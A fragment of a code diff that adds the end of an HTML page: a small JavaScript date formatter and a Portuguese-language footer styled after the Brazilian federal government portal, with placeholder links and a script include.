+        if (!data) return '';
+        // Assume formato YYYY-MM-DD
+        const partes = data.split('-');
+        if (partes.length === 3) {
+            return `${partes[2]}/${partes[1]}/${partes[0]}`;
+        }
+        return data;
+    }
+});
+</script>
+
+    </main>
+
+    <!-- Footer -->
+    <footer class="bg-gray-100 border-t border-gray-300 py-8 px-4">
+        <div class="max-w-6xl mx-auto">
+            <div class="grid grid-cols-1 md:grid-cols-4 gap-8">
+                <div>
+                    <h3 class="font-semibold text-gray-800 mb-4">Acesso Rápido</h3>
+                    <ul class="space-y-2 text-sm text-gray-600">
+                        <li><a href="#" class="hover:text-blue-700">Serviços</a></li>
+                        <li><a href="#" class="hover:text-blue-700">Notícias</a></li>
+                        <li><a href="#" class="hover:text-blue-700">Perguntas Frequentes</a></li>
+                        <li><a href="#" class="hover:text-blue-700">Fale Conosco</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h3 class="font-semibold text-gray-800 mb-4">Sobre</h3>
+                    <ul class="space-y-2 text-sm text-gray-600">
+                        <li><a href="#" class="hover:text-blue-700">Sobre o gov.br</a></li>
+                        <li><a href="#" class="hover:text-blue-700">Acessibilidade</a></li>
+                        <li><a href="#" class="hover:text-blue-700">Termos de Uso</a></li>
+                        <li><a href="#" class="hover:text-blue-700">Privacidade</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h3 class="font-semibold text-gray-800 mb-4">Órgãos</h3>
+                    <ul class="space-y-2 text-sm text-gray-600">
+                        <li><a href="#" class="hover:text-blue-700">Ministérios</a></li>
+                        <li><a href="#" class="hover:text-blue-700">Secretarias</a></li>
+                        <li><a href="#" class="hover:text-blue-700">Autarquias</a></li>
+                        <li><a href="#" class="hover:text-blue-700">Empresas Públicas</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h3 class="font-semibold text-gray-800 mb-4">Redes Sociais</h3>
+                    <div class="flex space-x-4">
+                        <a href="#" class="text-gray-600 hover:text-blue-700">
+                            <i class="fab fa-facebook-f"></i>
+                        </a>
+                        <a href="#" class="text-gray-600 hover:text-blue-700">
+                            <i class="fab fa-twitter"></i>
+                        </a>
+                        <a href="#" class="text-gray-600 hover:text-blue-700">
+                            <i class="fab fa-instagram"></i>
+                        </a>
+                        <a href="#" class="text-gray-600 hover:text-blue-700">
+                            <i class="fab fa-youtube"></i>
+                        </a>
+                    </div>
+                </div>
+            </div>
+            <div class="border-t border-gray-300 mt-8 pt-6 text-center text-sm text-gray-600">
+                <p>© 2025 Governo Federal do Brasil. Todos os direitos reservados.</p>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Scripts -->
+    <script src="js/custom.js"></script>
+
+</body></html>
